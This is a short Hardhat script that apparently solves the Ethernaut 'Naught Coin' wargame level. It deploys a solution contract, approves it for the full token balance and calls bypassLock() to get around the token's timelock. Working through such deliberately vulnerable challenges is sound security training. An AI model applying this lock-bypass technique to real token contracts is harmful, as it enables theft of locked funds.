const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const naughtCoinContract = '0xe6F9AD2a06a102A4Ac1369b4645B607c42a423c8';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const NaughtCoin = await ethers.getContractFactory('NaughtCoin', deployer);
  const naughtCoin = await NaughtCoin.attach(naughtCoinContract);

  const NaughtCoinSolution = await ethers.getContractFactory('NaughtCoinSolution', deployer);
  const naughtCoinSolution = await NaughtCoinSolution.deploy(naughtCoinContract);

  const balance = await naughtCoin.balanceOf(deployer.address);

  await naughtCoin.connect(deployer).approve(naughtCoinSolution.address, balance);
  const tx = await naughtCoinSolution.bypassLock();
  await tx.wait();

  console.log('Naught Coin lock bypassed.');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
